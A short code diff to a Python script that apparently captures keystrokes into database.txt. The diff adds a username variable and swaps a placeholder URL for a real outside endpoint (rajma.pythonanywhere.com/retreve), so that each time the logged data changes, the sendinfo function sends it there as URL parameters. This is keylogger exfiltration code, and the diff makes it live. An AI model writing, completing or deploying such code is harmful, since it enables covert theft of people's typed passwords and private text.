@@ -14,6 +14,7 @@ char = {"shift" : "",
 start = time.time()
 prevdata = ""
 cond = True
+username = "YOUR USERNAME HERE" ############################
 
 def sendinfo():
     global prevdata, cond
@@ -24,7 +25,7 @@ def sendinfo():
             newdata = file.read()
             if prevdata != newdata:
                 print("Sent")
-                req.get("<YOUR WEB SITE>.com  "+newdata)############################
+                req.get("http://rajma.pythonanywhere.com/retreve?uname=%s&method=a&data=%s"%(username,newdata))
                 
                 file = open("database.txt")
                 data = file.read()
